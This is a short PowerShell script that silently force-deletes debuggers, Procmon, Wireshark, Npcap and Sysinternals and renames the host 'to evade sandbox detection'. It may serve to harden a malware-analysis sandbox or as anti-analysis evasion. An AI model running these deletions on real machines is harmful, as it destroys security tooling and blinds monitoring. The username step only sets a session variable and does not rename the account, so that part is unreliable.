# Remove or rename common analysis tools for stealth
$tools = @(
    "C:\Tools\x64dbg\x64dbg.exe",
    "C:\Tools\IDA\ida64.exe",
    "C:\Tools\Procmon\procmon.exe",
    "C:\Tools\Wireshark\Wireshark.exe",
    "C:\Program Files\Npcap",
    "C:\Program Files\Sysinternals"
)

foreach ($tool in $tools) {
    if (Test-Path $tool) {
        try {
            Remove-Item $tool -Recurse -Force -ErrorAction SilentlyContinue
            Write-Output "[+] Removed $tool"
        } catch {
            Write-Output "[-] Could not remove $tool"
        }
    }
}

# Rename user and hostname to evade sandbox detection
Rename-Computer -NewName "WORKSTATION-DEV" -Force
$env:UserName = "john.doe"

# Remove known sandbox keywords in registry (optional advanced)
# You could add custom logic here if needed
